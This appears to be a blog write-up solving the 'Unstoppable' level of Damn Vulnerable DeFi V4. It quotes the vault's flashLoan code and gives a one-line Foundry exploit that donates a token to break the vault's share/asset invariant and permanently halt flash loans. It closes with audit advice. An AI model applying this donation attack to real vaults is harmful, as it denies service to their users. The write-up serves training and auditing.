# Unstoppable

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.

Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

# Solution

## Challenge Overview

**official site(https://www.damnvulnerabledefi.xyz/)**

The Unstoppable challenge is the first level in the Damn Vulnerable DeFi V4 series. The goal is simple: Make the flash loan functionality of the vault unusable.

## The Setup

The challenge includes:

- A UnstoppableVault contract that follows the ERC-4626 standard
- A UnstoppablePool contract that inherits from the vault
- The pool offers flash loans of DVT tokens
- The pool tracks deposits and total assets

## The Vulnerability

### The vault maintains an invariant check in the flashLoan function:

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }
```

```solidity
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
```

This check ensures that the total assets in the vault are properly represented by the shares. However, this invariant can be broken by sending tokens directly to the vault without minting corresponding shares.

## The Exploit

The attack is simple and elegant:

1. Transfer 1 DVT token directly to the vault address
2. This increases totalAssets() without increasing totalSupply
3. The invariant breaks
4. Any future flashLoan() calls will revert with InvalidBalance

**Foundry Exploit Code:**

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

Join The Writer's Circle event

You can also do :

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    require(token.transfer(address(vault), 1));
}
```

Use the given code in file “Unstoppable.t.sol” and run it using the given command :

```bash
forge test — mt test_unstoppable -vvvv
```

After running this command you will see the result in the terminal like this:

Press enter or click to view image in full size

**fig2 : terminal(Ubuntu)**

## Why This Works

**Step 1:** totalAssets() increases by 1

**Step 2:** convertToShares(totalSupply) stays the same

**Step 3:** The invariant convertToShares(totalSupply) == totalAssets() breaks

**Step 4:** flashLoan() reverts every time

## Key Takeaways

### For Auditors:

**1. Donation attacks are real :** Always assume assets can be sent directly to your contract

**2. Invariants need enforcement :** You can’t just check them; you need to protect against breakage

**3. Use virtual shares :** OpenZeppelin’s ERC-4626 implementation uses virtual shares to prevent this attack

